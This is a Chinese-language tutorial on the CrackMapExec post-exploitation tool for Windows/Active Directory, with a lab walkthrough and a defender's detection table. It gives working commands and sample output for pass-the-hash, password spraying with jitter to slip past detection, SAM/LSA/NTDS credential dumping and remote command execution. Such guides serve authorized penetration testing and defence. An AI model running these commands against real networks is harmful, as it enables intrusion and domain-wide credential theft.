# CrackMapExec（Windows/AD 批量评估「瑞士军刀」）

> **一句话**：一条命令把「一个账号/一个哈希」在**整个网段**上试一遍——SMB、WinRM、LDAP、MSSQL 全部覆盖，专门用来做凭据复用与横向扩散。
> **分类**：后渗透 / 横向移动 ｜ **Kali 包**：`crackmapexec`（命令 `crackmapexec`，常简写 `cme`）｜ **官方文档**：<https://github.com/mpgn/CrackMapExec>（**项目已停止维护，后继者为 NetExec**）

> ⚠️ **重要提示**：CrackMapExec（CME）原作者 `mpgn` 已停止维护，官方推荐迁移到 **NetExec（`nxc`）**。Kali 目前两个包都在：[`crackmapexec.md`](crackmapexec.md)（本篇）与 [`netexec.md`](netexec.md)。**新项目请直接用 NetExec**，命令几乎完全兼容，本文可当作两者的共同心智模型来读。

---

## 1. 它解决什么问题

拿到一个凭据后，真正的问题不是「怎么用它打一台」，而是「**它在 200 台主机里的哪几台能用、能用它做什么**」。手工对每台跑 `impacket-wmiexec` 是不可行的。

CME 把「**多协议 × 多目标 × 多凭据**」组合成一条命令：

```bash
cme smb 10.10.10.0/24 -u svc_backup -p 'Backup2023!' --shares --sessions --loggedon-users
```

一次跑完，输出一张按主机排列的表：哪些主机认证成功、共享里有什么、谁在这台机器上登录过。

| 你想要的 | CME 命令 |
|----------|----------|
| 验证凭据在全网段的可用性 | `cme smb <range> -u U -p P` |
| 用 NT hash 横向（PTH） | `cme smb <range> -u U -H <NTHASH>` |
| 枚举共享 / 用户 / 会话 / 已登录用户 | `--shares` / `--users` / `--sessions` / `--loggedon-users` |
| 抓 SAM / LSA / NTDS.dit | `--sam` / `--lsa` / `--ntds` |
| 远程执行命令 | `-x "cmd"`（有回显）/ `-X "ps"` |
| 在 MSSQL 上执行 | `cme mssql ... -q "select @@version"` |
| 找域管登录的主机 | `--local-auth` 对比 + `--loggedon-users` |

与同类对比：

- **vs `impacket`**：Impacket 是**单点精确手术刀**（一次一台，参数细）；CME 是**全网广播**（一次一片，输出表格）。先 CME 找点，再 Impacket 精打。
- **vs `bloodhound`**：BloodHound 看**图上的攻击路径**（理论上能到哪）；CME 做**实际连通性验证**（现在能不能到）。见 [`bloodhound.md`](bloodhound.md)。
- **vs `nmap`**：nmap 说 445 开着；CME 说「用这个凭据我能读它的 C$ 并执行命令」。

---

## 2. 工作原理

CME 的核心是**协议客户端库 + 并发调度 + 结果表格化**：

```
cme <protocol> <targets> [credentials] [action]
    │            │           │              └─ 要执行的动作（枚举/执行/抓取）
    │            │           └─ 凭据：明文 / NT hash / Kerberos 票据 / 匿名
    │            └─ 目标：单 IP / CIDR / 文件列表
    └─ 协议模块：smb / winrm / ldap / mssql / ssh / rdp / ftp / nfs / vnc
```

认证与执行的关键机制：

- **SMB 通道**：一次 `smb` 命令会先做 `NTLM` 认证（或 Kerberos），再按参数调用 `MSRPC`（`winreg`、`svcctl`、`srvsvc` 等接口）完成枚举与执行。**SMB 签名开启时，PTH 的许多动作会失败**（这是最常见的报错来源）。
- **执行方式**：`-x` 走 `smbexec` 风格（建服务 + 共享回显），`--exec-method` 可切换 `wmiexec`/`mmcexec`/`atexec`。
- **凭据来源标记**：输出中 `[+]` 认证成功、`(Pwn3d!)` 表示**该凭据对该主机有本地管理员权限**（可执行命令），这是 CME 最有价值的信号。
- **`--local-auth`**：把用户名当**本地账户**而不是域账户，用来验证「本地管理员口令复用」——这是内网大面积失陷的主因之一。

---

## 3. 安装与快速上手

```bash
sudo apt update
sudo apt install crackmapexec
crackmapexec --version
```

Kali 的 CME 还提供 `cmedb`（凭据/主机数据库查询）。

```console
$ crackmapexec --help | head -30
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL]
                    [--no-progress] [--verbose]
                    {ssh,mssql,smb,winrm,ldap,ftp,rdp,vnc,nfs} ...
```

> **注意**：`cme` 是社区习惯的别名（`alias cme='crackmapexec'`），Kali 安装后命令名是 `crackmapexec`。NetExec 的命令名是 `nxc`。

最小可用示例（**仅限授权/靶场**）：

```bash
crackmapexec smb 192.168.56.0/24 -u jdoe -p 'Summer2024!'
```

```console
SMB         192.168.56.10  445    DC01     [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:contoso.local) (signing:True) (SMBv1:False)
SMB         192.168.56.10  445    DC01     [+] contoso.local\jdoe:Summer2024!
```

---

## 4. 核心参数详解

### 4.1 通用（所有协议）

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-u USER` / `-p PASS` | 单个凭据 | 多凭据用 `-u users.txt -p pass.txt` |
| `-H HASH` | NT hash（PTH） | 只需 NT 部分 |
| `-k, --kerberos` | Kerberos 认证 | 需 FQDN + `/etc/hosts` + `KRB5CCNAME` |
| `--local-auth` | 本地账户认证 | 验证「本地管理员口令复用」必用 |
| `-d DOMAIN` | 指定域 | 别写 `.local` 后缀错误 |
| `-t THREADS` | 并发数 | 默认 100；大网段调到 200+，脆弱设备调低 |
| `--timeout N` | 单目标超时 | 跨网段/慢链路加大 |
| `--jitter` | 请求间随机延迟 | 规避频率检测（授权测试中用于模拟真实攻击者节奏） |
| `--continue-on-success` | **认证成功后继续试其它凭据** | 密码喷洒必开；默认成功即停 |
| `--no-bruteforce` | `-u`/`-p` 一一对应而非笛卡尔积 | 拿到「用户:密码」对照表时用 |
| `--verbose` | 详细输出 | 排错 |
| `--log FILE` | 结果写文件 | 报告留档 |

### 4.2 SMB 协议专属（最常用）

| 参数 | 作用 | 关键点 |
|------|------|--------|
| `--shares` | 枚举共享及权限 | 看 `READ`/`WRITE` 权限，`WRITE` 是下一步（投毒/上传）的入口 |
| `--users` | 枚举域用户 | 输出含 `badpwdcount`、`lastlogon`，可发现「被锁的账号」 |
| `--groups` | 枚举域组 | 找 Domain Admins 成员 |
| `--sessions` | 当前会话 | 谁从哪台机器连过来的反向线索 |
| `--loggedon-users` | 已登录用户（历史更全） | 找「域管在哪台机器上」→ 下一步打那台 |
| `--pass-pol` | 域密码策略 | **爆破前必须先看**：锁定阈值、最短长度 |
| `--rid-brute` | RID 枚举（无需凭据） | 匿名/低权时枚举用户名的常用手法 |
| `--sam` | 抓本地 SAM 哈希 | 需本地管理员 |
| `--lsa` | 抓 LSA Secrets | 含机器账户密钥、服务账号 |
| `--ntds` | 抓 NTDS.dit（DCSync/VSS） | 需域管；`--ntds vss` 走卷影 |
| `-x "cmd"` | 执行命令并**回显** | 需 `(Pwn3d!)` |
| `-X "pwsh"` | 执行 PowerShell | 同上 |
| `--exec-method` | `smbexec`/`wmiexec`/`mmcexec`/`atexec` | 一种方式被拦就换 |
| `--sam/--lsa/--ntds` 配合 `--just-dc-ntlm` | 只取 NT hash | 降低噪音 |
| `-M <module>` | 加载模块 | `crackmapexec smb -L` 列出全部模块（如 `lsassy`、`spider_plus`、`bitlocker`） |

### 4.3 其它协议的常用参数

| 协议 | 常用命令 | 用途 |
|------|----------|------|
| `winrm` | `cme winrm <range> -u U -p P -x whoami` | 走 5985 执行，常能绕过 SMB 签名限制 |
| `ldap` | `cme ldap <dc> -u U -p P --users --groups --trusted-for-delegation` | 域信息与委派配置 |
| `mssql` | `cme mssql <range> -u sa -p P -q "select @@version"` | MSSQL 直连执行/`--local-auth` 枚举实例 |
| `ssh` | `cme ssh <range> -u root -p P` | Linux 侧复用（SSH 口令复用） |
| `rdp` | `cme rdp <range> -u U -p P` | 验证 RDP 可用（**不爆破**，只验证） |

---

## 5. 实战演练

> **环境声明**：以下全部在**自建 AD 靶场**（GOAD、自建域控 + 域内主机，Host-Only 网络）中执行。示例：域 `contoso.local`，DC `192.168.56.10`，目标网段 `192.168.56.0/24`。**禁止对未授权网段执行任何认证尝试（哪怕是「只验证不爆破」）。** 认证尝试同样会触发账户锁定与告警。

### 场景 1：摸底 —— 无凭据与有凭据两种视角

```bash
# ① 无凭据：识别网段内 Windows 主机、域、是否强制签名、SMBv1 是否开启
crackmapexec smb 192.168.56.0/24
```

```console
SMB         192.168.56.10  445    DC01     [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:contoso.local) (signing:True) (SMBv1:False)
SMB         192.168.56.20  445    WEB01    [*] Windows Server 2016 Build 14393 x64 (name:WEB01) (domain:contoso.local) (signing:False) (SMBv1:True)
```

**解读（这是最有信息量的一次输出）**：

- `signing:True` → 该主机**强制 SMB 签名**，PTH 的 SMB 通道多数动作会失败，改用 WinRM/WMI。
- `signing:False` → **可做 SMB 中继（NTLM Relay）**，把 Responder 抓到的认证中继到它。
- `SMBv1:True` → 老协议，可能对应 MS17-010 之类的漏洞。
- `domain:contoso.local` → 确认域边界。

```bash
# ② 有凭据：验证一个域账号在全网段的可用性
crackmapexec smb 192.168.56.0/24 -u jdoe -p 'Summer2024!' --continue-on-success
```

```console
SMB         192.168.56.10  445    DC01     [+] contoso.local\jdoe:Summer2024!
SMB         192.168.56.20  445    WEB01    [+] contoso.local\jdoe:Summer2024!
```

### 场景 2：从普通账号到「本地管理员口令复用」→ Pwn3d! → 抓哈希

```bash
# ① 手上有本地管理员 hash（例如从某台机器的 SAM 里拿到的 Administrator:500）
crackmapexec smb 192.168.56.0/24 --local-auth \
  -u Administrator -H ':31d6cfe0d16ae931b73c59d7e0c089c0' --continue-on-success
```

```console
SMB         192.168.56.20  445    WEB01    [+] WEB01\Administrator:31d6cfe0d16ae931b73c59d7e0c089c0 (Pwn3d!)
SMB         192.168.56.30  445    FILE01   [+] FILE01\Administrator:31d6cfe0d16ae931b73c59d7e0c089c0 (Pwn3d!)
```

**解读**：`--local-auth` + 同一个 hash 在**多台主机**上都出现 `(Pwn3d!)` → **本地管理员口令复用**，这是内网横推的黄金路径。`(Pwn3d!)` 意味着可执行命令。

```bash
# ② 在 Pwn3d 的主机上枚举与抓取
crackmapexec smb 192.168.56.20 --local-auth -u Administrator -H ':31d6...' \
  --shares --sessions --loggedon-users

crackmapexec smb 192.168.56.20 --local-auth -u Administrator -H ':31d6...' \
  --sam --lsa --exec-method smbexec
```

```console
SMB         192.168.56.20  445    WEB01    [+] Dumping SAM hashes
SMB         192.168.56.20  445    WEB01    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.56.20  445    WEB01    [+] Dumping LSA secrets
SMB         192.168.56.20  445    WEB01    CONTOSO\WEB01$:aes256-cts-hmac-sha1-96:...
SMB         192.168.56.20  445    WEB01    [+] Found domain cached credentials
```

**解读**：SAM 给出本地账号 hash（可继续复用到其它机器）；LSA 给出**机器账户密钥**与**域缓存凭据**（`DCC2`，可离线爆破）。这些都是下一跳的凭据来源。

```bash
# ③ 发现域管登录过某台机器 → 优先打那台
crackmapexec smb 192.168.56.0/24 -u jdoe -p 'Summer2024!' --loggedon-users | grep -i admin
```

### 场景 3：密码喷洒 + WinRM 执行 + 拿到 NTDS（完整链条）

```bash
# ① 先看密码策略，确定「锁定阈值」再决定喷洒规模（这一步千万别跳）
crackmapexec smb 192.168.56.10 -u jdoe -p 'Summer2024!' --pass-pol
```

```console
SMB   ... SMB         192.168.56.10  445  DC01  [+] Dumping password info for domain: CONTOSO
SMB   ... Minimum password length: 7
SMB   ... Password History: 24
SMB   ... Account Lockout Threshold: 5        ← 关键！
SMB   ... Account Lockout Duration (minutes): 30
```

**解读**：锁定阈值 5 意味着**每个账号最多试 4 次**。喷洒要「**一账号一密码、横向铺开**」，绝不能「一账号多密码」。

```bash
# ② 喷洒（小规模、慢速、单向）
crackmapexec smb 192.168.56.10 -u /tmp/users.txt -p 'Summer2024!' \
  --continue-on-success --no-bruteforce -t 5 --jitter 2
```

```console
SMB  192.168.56.10  445  DC01  [+] contoso.local\jdoe:Summer2024!
SMB  192.168.56.10  445  DC01  [-] contoso.local\Administrator:Summer2024! STATUS_LOGON_FAILURE
SMB  192.168.56.10  445  DC01  [-] contoso.local\svc_backup:Summer2024! STATUS_LOGON_FAILURE
```

```bash
# ③ SMB 被签名限制？换 WinRM 通道执行
crackmapexec winrm 192.168.56.20 -u svc_backup -p 'Backup2023!' -x 'whoami /all'

# ④ 权限到位后抓 NTDS（域控）
crackmapexec smb 192.168.56.10 -u svc_backup -p 'Backup2023!' --ntds --just-dc-ntlm
```

```console
SMB  192.168.56.10  445  DC01  [+] contoso.local\svc_backup:Backup2023! (Pwn3d!)
SMB  192.168.56.10  445  DC01  [+] Dumping the NTDS, this could take a while so be patient
SMB  192.168.56.10  445  DC01  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB  192.168.56.10  445  DC01  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f1e2d3c4b5a6978877665544332211fa:::
```

**解读**：拿到 `krbtgt` 哈希即可伪造黄金票据（见 [`impacket.md`](impacket.md) 的 `impacket-ticketer`），拿到 `Administrator` NT hash 可直接 PTH 到任意域主机。至此**全域失陷**。

```bash
# ⑤ 留档：把结果写进文件，便于写报告
crackmapexec smb 192.168.56.0/24 -u svc_backup -p 'Backup2023!' \
  --shares --loggedon-users --log /tmp/cme_loot.log
```

---

## 6. 输出解读

| 输出 | 含义 | 下一步 |
|------|------|--------|
| `[*] Windows Server ... (signing:True) (SMBv1:False)` | 主机指纹 + 安全配置 | `signing:False` → 可考虑 NTLM 中继；`SMBv1:True` → 查老漏洞 |
| `[+] domain\user:pass` | **认证成功** | 看有没有 `(Pwn3d!)` |
| `(Pwn3d!)` | 该凭据对该主机**有本地管理员权限** | `-x` 执行、`--sam/--lsa/--ntds` 抓取 |
| `[-] ... STATUS_LOGON_FAILURE` | 凭据错误 | 注意锁定计数，**不要重试同一账号** |
| `STATUS_ACCOUNT_LOCKED_OUT` | 账号已锁（你造成的） | 立即停手并记录；等锁定时间过后再评估 |
| `[+] Dumping LSA secrets` | 拿到机器账户密钥/DPAPI | 机器账户可做白银票据 |
| `Domain Cached Credentials` | DCC2 哈希 | 离线爆破（`hashcat -m 2100`） |
| `(Guest)` / `(null session)` | 匿名可读 | 信息泄露，通常能拉用户列表 |
| `--shares` 里 `READ,WRITE` | 可写共享 | 可能用于投毒/上传（授权测试中作为风险证据记录） |
| `--loggedon-users` 出现 `CONTOSO\Domain Admin` | 域管登录过该主机 | 优先攻陷该主机（内存里可能有域管票据） |
| `Connection refused` / `timed out` | 主机不在线/端口被过滤 | 排除误报，别无脑重扫 |

---

## 7. 与其他工具配合

```
① 存活与指纹：nmap / cme smb <range>（无凭据）
        │
② 有凭据后：cme smb --continue-on-success ──► 找到 (Pwn3d!)
        │                                            │
        ├─► cme smb --sam/--lsa ──► 本地 hash ──► 复用（--local-auth）→ 雪球效应
        ├─► cme smb --ntds ──► 域内全量 hash ──► impacket-ticketer 伪造票据
        ├─► cme smb --loggedon-users ──► 找域管所在主机 ──► 打那台
        │
③ 精打（单点、参数细）   impacket-wmiexec / psexec / secretsdump
④ 交互式 shell          evil-winrm
⑤ 看攻击路径            bloodhound
⑥ 隧道与更深内网        chisel / ligolo-ng + proxychains4
⑦ 破解               hashcat（-m 1000 NT / 2100 DCC2 / 13100 TGS / 18200 ASREP / 5500 NetNTLMv2）
```

- 后继工具（**推荐**）：[`netexec.md`](netexec.md)
- 单点精打：[`impacket.md`](impacket.md)
- 交互 shell：[`evil-winrm.md`](evil-winrm.md)
- 攻击路径：[`bloodhound.md`](bloodhound.md)
- 中继（配合 `signing:False` 的主机）：`impacket-ntlmrelayx` + `../07-嗅探与欺骗/`

---

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
|-----------|------|------|
| `STATUS_ACCESS_DENIED` 但凭据明明对 | **SMB 签名强制** → PTH 受限 | 换 `cme winrm` 通道，或用 Kerberos；Impacket 走 WMI |
| `STATUS_LOGON_FAILURE` 之后账号被锁 | 触发了锁定策略 | 先 `--pass-pol`；喷洒改为「一账号一密码」；`--jitter` 降速 |
| `cme` 命令不存在 | Kali 未提供该别名 | 用 `crackmapexec`，或自建 `alias cme=crackmapexec` |
| `-H` 传了 LM:NT 全串 | 参数只要 NT 部分 | `-H '<NT>'` 或 `-H ':NT'` |
| `--ntds` 报 `DRSR SessionError` | 无复制权限 | 换有权限的账号（域管/DC 机器账户），或 `--ntds vss` |
| `--ntds` 极慢 | 走 VSS 需要下载 NTDS.dit | 优先 DCSync 路径，或加 `--just-dc-ntlm` 减量 |
| `-x` 无回显 | 执行方法被拦（EDR/服务限制） | 换 `--exec-method wmiexec`/`atexec`；或改 WinRM |
| 中文乱码 | 编码不匹配 | `--codec` 或用 `-x 'chcp 65001 & ...'` |
| Kerberos 模式失败 | 缺 FQDN/`/etc/hosts`/`krb5.conf` | 补齐三件套，用 `-k --use-kcache` 配合 `KRB5CCNAME` |
| 目标主机 CPU/服务被拖垮 | 并发过高 | `-t` 调低（老设备 10–20） |
| 输出太多看不清 | 大网段刷屏 | 重定向到文件 + `grep '\[+\]'` |
| CME 已停更导致某些模块失效 | 项目维护终止 | **迁移到 NetExec** |

---

## 9. 防御视角（蓝队）

| 攻击阶段 | 检测信号 | 缓解措施 |
|----------|----------|----------|
| 无凭据摸底 | 单源 IP 对多主机 445 的**大量连接**（含失败） | IDS 横向扫描告警、网络分段、禁用 SMBv1 |
| 密码喷洒 | 事件 **4625**（登录失败）在**多账号**上出现、来源集中 | 账户锁定策略、**智能锁定**、监控 4625 聚合、禁用 NTLM |
| 本地管理员复用 | 事件 **4624 类型 3** 同一账号跨多主机成功登录 | **LAPS**（每台唯一随机密码）、限制本地管理员、禁用内置 Administrator |
| SAM/LSA 远程读取 | 4656/4663 对 `HKLM\SAM`、`SECURITY` 的远程访问；RemoteRegistry 服务被启动 | 禁用 RemoteRegistry、限制 445 入站、EDR 注册表行为告警 |
| DCSync / `--ntds` | 事件 **4662**（DS-Replication 权限使用）、非 DC 发起复制 | 收紧复制权限、高级审计、监控 4662 |
| WinRM 执行 | 事件 **91/168**（WinRM 操作日志）、5985 入站异常连接 | 限制 WinRM 来源、仅 HTTPS（5986）+ 证书 |
| 服务创建式执行 | 事件 **7045**、`ADMIN$` 落地文件 | EDR 服务创建告警、限制本地管理员 |
| `--loggedon-users` 侦察 | 事件 4624 集中读取（会话枚举） | 会话枚举审计、最小权限 |
| 频率规避（`--jitter`） | 时间分布异常均匀的失败登录 | 行为基线 + 长周期关联分析 |

**蓝队最重要的一条**：**部署 LAPS 并把 SMB 签名设为强制、禁用 NTLM**，直接瓦解 CME/NetExec 最常用的两条横移路径。

---

## 10. 参考

- CrackMapExec 官方仓库（已归档）：<https://github.com/mpgn/CrackMapExec>
- Kali 工具页：<https://www.kali.org/tools/crackmapexec/>
- 后继项目 NetExec：<https://github.com/Pennyw0rth/NetExec>（对应教程 [`netexec.md`](netexec.md)）
- 本地命令：`crackmapexec --help`、`crackmapexec smb --help`、`crackmapexec smb -L`（模块列表）

## ⚠️ 法律与伦理

对**未授权**网段做认证尝试、密码喷洒、哈希转储，均属违法行为，可能触犯《刑法》第 285 条（非法获取计算机信息系统数据、非法控制计算机信息系统）、第 286 条（破坏计算机信息系统）以及《网络安全法》《个人信息保护法》。

即使操作者主观上「只是想验证连通性」，**对非授权主机发起认证即为入侵尝试**，日志会完整留存。本教程仅适用于：**有书面授权的渗透测试与红队演练、CTF、自建 AD 靶场（GOAD）、蓝队检测验证**。操作须在约定时间窗内进行，并提前与蓝队对齐「允许的爆破强度」，避免真的锁死生产账号。
